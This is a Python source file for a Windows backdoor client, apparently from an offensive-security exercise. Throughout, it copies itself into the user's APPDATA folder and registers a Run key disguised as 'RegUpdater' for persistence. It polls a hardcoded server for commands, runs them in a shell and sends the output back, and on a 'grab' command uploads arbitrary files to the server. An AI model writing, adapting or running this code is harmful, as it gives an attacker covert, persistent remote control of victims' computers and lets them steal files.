
import requests as req 
from subprocess import Popen, PIPE
from time import sleep
from random import randrange
from shutil import copy
import winreg as wreg
import os

class WebClient:
    def __init__(self):
        self.SERVER_IP = '192.168.0.123'
        self.SERVER_PORT = 5000
        # Persistence I: copy script to random appdata location
        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
        self.PATH = os.path.realpath(__file__)
        copy(self.PATH, self.APPDATA_PATH)
        # Persistence II: registry key pointing to the copied file
        self.addRegkey()

    def addRegkey(self):
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
        key.Close()
    
    def run(self):
        while True: 
            # Send GET request to server
            get_req = req.get(f'http://{self.SERVER_IP}:{self.SERVER_PORT}') 
            # store received txt into command variable
            command = get_req.text 
            if 'terminate' in command:
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=b"Directory changed." ) 
                except Exception as e:
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=str(e).encode() ) 
            elif 'grab' in command:
                path = command.split()[-1] 
                if os.path.exists(path): 
                    # Appended /store in the URL
                    url = f'http://{self.SERVER_IP}:{self.SERVER_PORT}/store'
                    
                    files = {'filename':path, 'file': open(path, 'rb')} 
                    # Send the file, requests use POST method called "multipart/form-data"
                    r = req.post(url, files=files) 
                else:
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data='[!] File not found.' )
            else:
                cmd = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                # POST results
                post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=cmd.stdout.read() ) 
                # or error 
                post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=cmd.stdout.read() )

            # sleep(3)

def main():
    c = WebClient()
    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
    while True:
        try:
            if c.run():
                break
        except:
            sleep_for = randrange(1, 10)
            sleep( sleep_for )

if __name__ == "__main__":
    main()